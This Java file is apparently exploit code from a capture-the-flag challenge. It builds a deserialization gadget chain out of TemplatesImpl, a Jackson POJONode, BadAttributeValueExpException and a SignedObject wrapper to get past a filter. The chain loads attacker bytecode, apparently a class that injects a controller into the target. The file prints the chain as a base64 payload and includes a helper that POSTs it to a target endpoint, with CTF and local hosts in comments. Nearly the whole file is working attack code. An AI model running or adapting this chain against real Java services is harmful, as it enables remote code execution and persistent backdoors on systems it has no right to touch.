package jackson;

import com.alibaba.fastjson.JSONArray;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.ObjectMapper.DefaultTyping;
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.ResponseEntity;
import org.springframework.web.client.RestTemplate;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.net.URI;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.*;
import java.sql.SQLOutput;
import java.util.Base64;

public class Test {
    public static void main(String[] args) throws Exception {

        Templates templatesimpl = new TemplatesImpl();

//        byte[] bytecodes = Files.readAllBytes(Paths.get("C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class"));
        byte[] bytecodes = Files.readAllBytes(Paths.get("C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\jackson\\InjectToController.class"));

        setValue(templatesimpl,"_name","aaa");
        setValue(templatesimpl,"_bytecodes",new byte[][] {bytecodes});
        setValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());


        POJONode jsonNodes = new POJONode(templatesimpl);

        BadAttributeValueExpException exp = new BadAttributeValueExpException(1);
//        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
//        val.setAccessible(true);
//        val.set(exp,jsonNodes);
        setValue(exp,"val",jsonNodes);

        KeyPairGenerator keyPairGenerator;
        keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signingEngine = Signature.getInstance("DSA");
        SignedObject signedObject = new SignedObject(exp,privateKey,signingEngine);
        POJONode jsonNode = new POJONode(signedObject);
        BadAttributeValueExpException exp1 = new BadAttributeValueExpException(null);
        setValue(exp1,"val",jsonNode);

//        ByteArrayOutputStream baos = new ByteArrayOutputStream();
//        ObjectOutputStream oos = new ObjectOutputStream(baos);
//        oos.writeInt(1949);
//        oos.writeUTF("NEEPU");
//        oos.writeObject(exp);
//        ByteArrayOutputStream barr = new ByteArrayOutputStream();
//        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);
//        objectOutputStream.writeObject(exp);

//        deserial(serial(objectOutputStream));
//        FileOutputStream fout=new FileOutputStream("1.ser");
//        fout.write(barr.toByteArray());
//        fout.close();
//        FileInputStream fileInputStream = new FileInputStream("1.ser");
//        byte[] byt=new byte[fileInputStream.available()];
//        fileInputStream.read(byt);
//        doPOST(byt);

        System.out.println((serial(exp1)));


    }

    public static String serial(Object o) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();

        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
        return base64String;

    }

    public static void deserial(String data) throws Exception {
        byte[] base64decodedBytes = Base64.getDecoder().decode(data);
        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }

    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void doPOST(byte[] obj) throws Exception{
        HttpHeaders requestHeaders = new HttpHeaders();
        requestHeaders.set("Content-Type", "text/plain");
//        URI url = new URI("http://neepusec.fun:27010/nomap");
        URI url = new URI("http://192.168.113.134:8080/bypassit");
        //URI url = new URI("http://localhost:8080/bypassit");
        HttpEntity<byte[]> requestEntity = new HttpEntity <> (obj,requestHeaders);

        RestTemplate restTemplate = new RestTemplate();
        ResponseEntity<String> res = restTemplate.postForEntity(url, requestEntity, String.class);
        System.out.println(res.getBody());
    }

}
